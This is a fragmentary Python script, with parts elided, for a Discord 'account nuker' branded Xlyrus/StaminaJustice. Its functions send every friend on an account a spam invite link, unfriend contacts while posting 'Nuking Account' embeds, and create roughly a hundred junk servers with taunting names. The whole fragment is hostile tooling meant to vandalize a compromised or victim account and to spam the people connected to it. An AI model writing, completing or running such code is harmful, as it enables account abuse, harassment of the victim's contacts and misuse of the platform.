...
def nuke():
    ...
    async def on_ready(times: int = 100):
        ...
        for user in bot.user.friends:
            try:
                await user.dm_channel.send('discord.gg/chiefjustice')
        ...
        for i in range(times):
            await bot.create_guild('Xlyrus Nuked', region=None, icon=None)
...
def unfriender():
    ...
    async def on_ready():
        ...
        for user in bot.user.friends:
            try:
                embed=discord.Embed(title="Nuking Account", description="Xlyrus Account Nuker <$", color=0x0000ff) 
                embed.set_author(name="StaminaJustice <$") 
                embed.set_footer(text="SJ Taking Over")
    ...
    async def on_ready(times: int = 95):
        ...
        for i in range(times):
            await bot.create_guild(
                'Fucked By Bando Lol', region=None, icon=None)
            print(f'{i} useless server created')
